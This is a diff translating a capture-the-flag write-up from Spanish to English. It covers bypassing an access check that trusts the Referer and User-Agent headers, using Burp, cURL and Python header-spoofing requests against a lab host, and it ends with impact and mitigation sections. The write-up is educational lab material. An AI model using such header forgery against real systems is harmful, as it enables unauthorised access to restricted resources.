@@ -1,44 +1,44 @@
 # A5 - Broken Access Control (HTTP Header Validation)
 
-Vulnerabilidad del OWASP Top 10 (2017). La aplicación restringe el acceso a un recurso validando los headers `Referer` y `User-Agent`, pero ambos son completamente controlables por el cliente y no constituyen un mecanismo de seguridad válido.
+OWASP Top 10 (2017) vulnerability. The application restricts access to a resource by validating `Referer` and `User-Agent` headers, but both are completely client-controllable and do not constitute a valid security mechanism.
 
 ---
 
-## Pasos para obtener la flag
+## Steps to Obtain the Flag
 
-### 1. Identificar el vector
+### 1. Identify the Vector
 
-Al inspeccionar el HTML de la página objetivo se encuentran comentarios que revelan los requisitos:
+Inspecting the HTML of the target page reveals comments that reveal requirements:
 ```
 <!-- You must come from : "https://www.nsa.gov/". -->
 ```
 
-El servidor valida:
+The server validates:
 - `Referer: https://www.nsa.gov/`
 - `User-Agent: ft_bornToSec`
 
-### 2. Explotar
+### 2. Exploit
 
-**Opción A – Burp Suite:**
-1. Interceptar la petición GET a la página.
-2. Cambiar el `User-Agent`:
+**Option A – Burp Suite:**
+1. Intercept the GET request to the page.
+2. Change the `User-Agent`:
    ```
    User-Agent: ft_bornToSec
    ```
-3. Cambiar el `Referer`:
+3. Change the `Referer`:
    ```
    Referer: https://www.nsa.gov/
    ```
-4. Reenviar → el servidor devuelve la **flag**.
+4. Resend → the server returns the **flag**.
 
-**Opción B – cURL:**
+**Option B – cURL:**
 ```bash
 curl -H "User-Agent: ft_bornToSec" \
      -H "Referer: https://www.nsa.gov/" \
      "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
 ```
 
-**Opción C – Python:**
+**Option C – Python:**
 ```python
 import requests
 
@@ -50,23 +50,23 @@ response = requests.get('http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00
 print(response.text)
 ```
 
-### 3. Por qué funciona
+### 3. Why It Works
 
-Los headers HTTP son enviados por el cliente y pueden falsificarse libremente. El servidor los acepta sin ninguna verificación criptográfica ni de origen real.
-
----
-
-## Impacto
-
-- **Bypass de validación:** acceso a recursos restringidos sin estar en el origen legítimo.
-- **Suplantación de cliente:** hacerse pasar por un agente o referrer confiable.
-- **Escalada de privilegios:** acceso a funcionalidades no autorizadas.
+HTTP headers are sent by the client and can be freely forged. The server accepts them without any cryptographic verification or real origin checking.
 
 ---
 
-## Mitigación
+## Impact
 
-1. **Nunca usar headers HTTP como control de acceso:** `Referer` y `User-Agent` son datos no verificables.
-2. **Autenticación robusta en servidor:** sesiones, tokens firmados (JWT, CSRF tokens).
-3. **No exponer lógica de validación en comentarios HTML.**
-4. **Logging:** registrar accesos con origenes inesperados para detectar abusos.
+- **Validation Bypass:** access to restricted resources without being from the legitimate origin.
+- **Client Impersonation:** impersonate a trusted agent or referrer.
+- **Privilege Escalation:** access to unauthorized functionality.
+
+---
+
+## Mitigation
+
+1. **Never Use HTTP Headers as Access Control:** `Referer` and `User-Agent` are non-verifiable data.
+2. **Robust Server Authentication:** sessions, signed tokens (JWT, CSRF tokens).
+3. **Don't Expose Validation Logic in HTML Comments.**
+4. **Logging:** record accesses from unexpected origins to detect abuse.
